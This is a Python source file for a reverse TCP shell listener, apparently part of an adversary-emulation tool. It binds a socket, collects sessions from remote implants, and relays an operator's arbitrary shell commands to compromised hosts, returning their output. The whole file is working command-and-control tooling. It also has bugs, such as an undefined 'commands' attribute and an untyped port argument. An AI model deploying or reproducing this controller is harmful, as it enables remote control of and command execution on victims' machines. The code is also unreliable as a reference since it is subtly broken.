import argparse
import asyncio
import signal
import socket
import struct
import sys
import threading
import time

from queue import Queue

queue = Queue()


class C2:

    def __init__(self):
        self.special_help = dict()

    def execute_special(self, cmd):
        print('Command not recognized')


class ListeningPost(C2):

    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.socket = None
        self.all_connections = []
        self.all_addresses = []
        self.connection_retry = 5
        shell_help = dict(help='Show this help', sessions='List sessions', enter='Enter a session by index')
        self.help = {**shell_help, **self.special_help}

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self._quit_gracefully)
        signal.signal(signal.SIGTERM, self._quit_gracefully)

    def socket_bind(self):
        try:
            self.socket = socket.socket()
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.connection_retry)
        except socket.error as e:
            print('Socket binding error: %s' % e)
            time.sleep(self.connection_retry)
            self.socket_bind()

    def accept_connections(self):
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode('utf-8')
                address = address + (client_hostname,)
                self.all_connections.append(conn)
                self.all_addresses.append(address)
                print('New session: {0} ({1})'.format(address[-1], address[0]))
            except Exception as e:
                print('Error accepting connections: %s' % e)

    def start_shell(self):
        while True:
            cmd = input('caldera> ')
            if cmd == 'sessions':
                self._list_connections()
            elif 'enter' in cmd:
                self._send_target_commands(int(cmd.split(' ')[-1]))
            elif cmd == 'help':
                self._print_help()
            elif cmd == '':
                pass
            else:
                self.execute_special(cmd)

    def _quit_gracefully(self, signal=None, frame=None):
        for conn in self.all_connections:
            conn.shutdown(2)
            conn.close()
        print('Connection closed')
        sys.exit(0)

    def _print_help(self):
        for cmd, v in self.commands.items():
            print('{0}: {1}'.format(cmd, v))

    def _list_connections(self):
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
                print(i, self.all_addresses[i][0], self.all_addresses[i][1], self.all_addresses[i][2])
            except Exception:
                del self.all_connections[i]
                del self.all_addresses[i]

    def _read_command_output(self, conn):
        raw_msg_len = self._recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        return self._recvall(conn, msg_len)

    @staticmethod
    def _recvall(conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def _send_target_commands(self, target):
        conn = self.all_connections[target]
        conn.send(str.encode(' '))
        cwd_bytes = self._read_command_output(conn)
        cwd = str(cwd_bytes, 'utf-8')
        print(cwd, end='')
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self._read_command_output(conn)
                    client_response = str(cmd_output, 'utf-8')
                    print(client_response, end='')
                if cmd == 'background':
                    print('\n')
                    break
            except Exception as e:
                print('Connection was lost %s' % e)
                break
        del self.all_connections[target]
        del self.all_addresses[target]


def create_workers(host, port):
    server = ListeningPost(host, port)
    server.register_signal_handler()
    for _ in range(2):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()


def create_jobs():
    queue.put(0)
    queue.put(1)
    queue.join()


def work(server):
    while True:
        x = queue.get()
        if x == 0:  # handle clients
            server.socket_bind()
            server.accept_connections()
        if x == 1:  # handle server
            server.start_shell()
        queue.task_done()


def main():
    parser = argparse.ArgumentParser('Reverse TCP shell')
    parser.add_argument('-H', '--host', required=False, default='0.0.0.0')
    parser.add_argument('-P', '--port', required=False, default=8889)
    args = parser.parse_args()
    create_workers(args.host, args.port)
    create_jobs()


if __name__ == '__main__':
    # loop = asyncio.get_event_loop()
    # loop.run_until_complete(main(loop))
    main()
